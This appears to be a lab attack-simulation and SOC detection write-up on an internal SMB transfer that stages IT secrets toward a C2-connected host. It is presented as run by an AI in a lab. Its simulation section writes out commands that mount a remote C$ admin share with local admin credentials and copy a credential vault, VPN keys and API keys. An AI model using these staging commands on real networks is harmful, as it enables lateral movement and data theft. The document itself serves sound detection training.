# AGC-065 -- Unusual Internal SMB Transfer

> **Execution & Documentation Note:** This scenario was executed
> and documented in full by Claude (Anthropic AI), operating
> autonomously on the lab infrastructure. All commands, detection
> analysis, investigation steps, and conclusions in this report
> were performed by AI, not by a human analyst.

## Card

| Field | Value |
|---|---|
| ID | `AGC-065` |
| Category | `10-exfiltration` -- Exfiltration |
| MITRE Technique | `T1074.001` Data Staged: Local Data Staging (internal consolidation toward externally-connected host) |
| Verdict | True Positive |
| Confidence | High |
| Time to Detect | Sysmon EID 1 (net.exe with admin share path and credentials) |
| Time to Triage | 05:00 (identify source/destination, assess destination's external connectivity, correlate with prior exfil) |
| Affected Systems | Source: `WIN-CLIENT-02` (10.10.10.102), Destination: `COMPROMISED-HOST-01` (10.10.10.103) |
| Chain | < AGC-064 . next AGC-066 > |
| One-line Summary | Internal SMB transfer attempt from WIN-CLIENT-02 to COMPROMISED-HOST-01's admin share (`\\10.10.10.103\C$`) using local admin credentials (`wadmin`). 6 IT-sensitive files (asset inventory, network diagrams, VPN configs, admin password vault, firewall rules, SIEM API keys) staged for transfer. Connection failed (error 67 -- admin shares not accessible), but the attempt was captured by Sysmon EID 1 with cleartext credentials. The key investigative insight: the destination host (COMPROMISED-HOST-01) has established external connectivity to the C2 server, making this a staging-toward-exfil operation. |

## Attacker Perspective

### Tradecraft

**What:** After compromising one host, attackers laterally collect data from other hosts and consolidate it on a single machine with external connectivity for exfiltration. This two-stage pattern:
1. **Internal staging:** Copy sensitive data from multiple hosts to one consolidation point via SMB
2. **External exfiltration:** Upload the consolidated data from the externally-connected host (AGC-062)

**Why an Attacker Uses It Here:**
- WIN-CLIENT-02 (raj.patel, IT-Support) has access to IT-sensitive files that the compromised account (michael.chen) may not
- COMPROMISED-HOST-01 has established C2 connectivity to 10.10.40.10 (AGC-051/055/056/062)
- Consolidating data on the externally-connected host avoids needing to establish new C2 channels from other hosts
- The `C$` admin share provides write access to the entire filesystem without requiring a user-shared folder

**Destination awareness:** The critical investigative insight is that the transfer destination is not arbitrary -- it specifically targets the host known to have external connectivity. This transforms "unusual internal file transfer" into "staging data for exfiltration."

### Simulation

**Pre-conditions:**
- `WIN-CLIENT-02` running, Administrator context (IT-Support role)
- `COMPROMISED-HOST-01` running at 10.10.10.103
- 6 IT-sensitive files created in staging directory

**Execution:**
```powershell
# Mount admin share on COMPROMISED-HOST-01
net use \\10.10.10.103\C$ /user:wadmin [REDACTED]

# Copy IT-sensitive files to destination staging directory
Copy-Item -Path "C:\Windows\Temp\agc065_collected\*" -Destination "\\10.10.10.103\C$\Windows\Temp\agc065_incoming\" -Recurse
```

**Result:** SMB connection failed with error 67 ("The network name cannot be found") -- admin shares (C$) are not accessible between lab endpoints. The net.exe process with cleartext credentials was captured by Sysmon EID 1.

**Lab constraint:** Admin shares (C$, ADMIN$) are blocked between endpoints in this lab configuration. In a production Active Directory environment with local admin credentials, C$ access would succeed.

## SOC Perspective

### Detection

**Sysmon EID 1 -- net.exe SMB mount with cleartext credentials (source: WIN-CLIENT-02):**
```
Process Create:
UtcTime: 2026-09-15 22:55:42.819
ProcessGuid: {bf260c57-ccee-6aa9-5e01-000000000e00}
ProcessId: 5012
Image: C:\Windows\System32\net.exe
CommandLine: "C:\WINDOWS\system32\net.exe" use \\10.10.10.103\C$ /user:wadmin [REDACTED]
User: WIN-CLIENT-02\Administrator
IntegrityLevel: High
Hashes: MD5=8A1E71312BD2AAE202652113049CDBD1
```

**Critical finding:** Local admin credentials (`wadmin` / `[REDACTED]`) exposed in cleartext in the CommandLine field. Same credential exposure pattern as AGC-060.

**Sysmon EID 1 -- PowerShell orchestration:**
```
Process Create:
UtcTime: 2026-09-15 22:55:40.007
ProcessGuid: {bf260c57-ccec-6aa9-5d01-000000000e00}
ProcessId: 1676
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\Temp\agc065-sim.ps1
User: WIN-CLIENT-02\Administrator
```

**Sysmon EID 3 -- Network Connection: 0 events**
SMB connections by net.exe are filtered by SwiftOnSecurity Sysmon config (consistent gap).

### Investigation

**Step 1 -- Destination awareness:**
The transfer targets `\\10.10.10.103\C$` -- COMPROMISED-HOST-01. This host has confirmed external connectivity:
- C2 beacon to 10.10.40.10 (AGC-051/055/056)
- Successful HTTPS exfiltration (AGC-062)
- DNS tunneling exfiltration (AGC-063)
An internal transfer to this specific host is not routine file sharing -- it is staging data on the exfiltration endpoint.

**Step 2 -- Source data sensitivity assessment:**
The 6 files prepared for transfer are IT infrastructure secrets:
- IT-Asset-Inventory.xlsx: Full asset inventory with serial numbers
- Network-Diagram-Internal.vsdx: Internal network topology
- VPN-Config-Export.txt: VPN pre-shared keys
- Admin-Password-Vault.kdbx: KeePass admin credential database
- Firewall-Rules-Export.csv: Firewall rules with NAT entries
- SIEM-API-Keys.json: Wazuh and Security Onion API keys

This is the IT-Support role's most sensitive data -- exfiltration would compromise the entire network infrastructure.

**Step 3 -- Credential assessment:**
The `wadmin` account is a local admin account shared across all Windows endpoints. Using it to mount C$ admin shares demonstrates lateral movement capability. The cleartext password in the CommandLine is a secondary finding.

**Step 4 -- Attack chain completion:**
```
WIN-CLIENT-02 (IT data) --[SMB C$]--> COMPROMISED-HOST-01 --[HTTPS/DNS]--> 10.10.40.10
```
Even though the SMB transfer failed, the intent chain is clear: consolidate IT infrastructure data on the externally-connected host for exfiltration.

### Report

**Verdict: True Positive** -- Internal SMB transfer attempt staging data toward externally-connected host.

**Confidence: High** -- The destination awareness (COMPROMISED-HOST-01 has C2 connectivity) elevates this above a generic "unusual internal transfer":
1. Destination host has confirmed C2 and exfiltration capability
2. Source data is IT infrastructure secrets (network diagrams, admin credentials, firewall rules)
3. `wadmin` credential usage indicates lateral movement
4. SMB admin share (C$) usage bypasses user-level file sharing controls

**Response recommendation:**
1. **Isolate both hosts** -- WIN-CLIENT-02 (source of IT secrets) and COMPROMISED-HOST-01 (confirmed C2)
2. **Rotate the `wadmin` local admin password** across all endpoints immediately -- it was exposed in cleartext
3. **Audit COMPROMISED-HOST-01** for any data that successfully arrived from other hosts
4. **Review internal SMB traffic** -- alert on any C$ or ADMIN$ access between workstations (this should not occur in normal operations)
5. **Implement network segmentation** -- restrict SMB (445/TCP) between workstations by default; only allow workstation-to-server SMB

### MITRE Mapping

| Tactic | Technique ID | Technique Name | Evidence | Confidence |
|---|---|---|---|---|
| Collection (TA0009) | T1074.001 | Data Staged: Local Data Staging | net.exe use \\10.10.10.103\C$ from WIN-CLIENT-02 with wadmin credentials. 6 IT-sensitive files staged. Destination = confirmed C2 host. Connection failed (error 67). Cleartext credentials in EID 1. | High |

## Evidence

Screenshots: not applicable (text-based evidence collection only).

### SMB transfer attempt chain

```
Source:      WIN-CLIENT-02 (10.10.10.102, raj.patel IT-Support)
Destination: COMPROMISED-HOST-01 (10.10.10.103, C2-connected)
Method:      net use \\10.10.10.103\C$ /user:wadmin [REDACTED]
Result:      Error 67 (admin shares blocked in lab)
Intent:      Stage 6 IT-sensitive files on exfil endpoint

Files prepared for transfer:
  IT-Asset-Inventory.xlsx     (asset serial numbers, user assignments)
  Network-Diagram-Internal.vsdx (network topology, VLAN assignments)
  VPN-Config-Export.txt       (pre-shared keys, remote access config)
  Admin-Password-Vault.kdbx   (KeePass admin credential database)
  Firewall-Rules-Export.csv   (NAT rules, port forwarding)
  SIEM-API-Keys.json          (Wazuh + Security Onion API keys)
```

### Attack chain: staging toward exfiltration

```
Phase 1 - Lateral Collection:
  WIN-CLIENT-02 (IT data) --[SMB C$]--> COMPROMISED-HOST-01
  
Phase 2 - External Exfiltration (from COMPROMISED-HOST-01):
  COMPROMISED-HOST-01 --[HTTPS POST]--> 10.10.40.10 (AGC-062)
  COMPROMISED-HOST-01 --[DNS tunnel]--> 10.10.40.10 (AGC-063)

Key insight: The destination of the internal transfer is not arbitrary.
It specifically targets the host with established C2 connectivity.
```
